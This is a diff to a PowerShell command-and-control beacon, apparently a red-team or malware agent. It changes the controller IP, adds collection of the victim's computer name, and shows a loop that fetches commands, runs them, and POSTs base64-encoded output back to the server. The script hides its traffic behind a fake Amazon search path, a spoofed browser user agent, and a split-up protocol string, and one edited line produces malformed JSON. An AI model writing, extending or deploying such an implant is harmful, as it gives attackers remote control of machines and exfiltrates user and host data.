@@ -1,5 +1,5 @@
 $h0 = "192.168"
-$me = ".0.26"
+$me = ".0.90"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
@@ -9,11 +9,12 @@ $h0me = $url+$uri
 $type = "ps1"
 $id = Get-Random
 $un = $env:username
+$hn = $env:computername
 $sleepytime = 3000
 $jsObject = @{}
 
 $useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"
+$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`"}"
 
 function ConvertTo-Hashtable {
   [CmdletBinding()]
@@ -128,7 +129,7 @@ while ($True) {
 			$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
 		}
 		$jsObject.cmnd = ""
-		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"$rettype`": `"$ncoded`"}"
+		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`" `"$rettype`": `"$ncoded`"}"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
 	}
 	Start-Sleep -Milliseconds $sleepytime
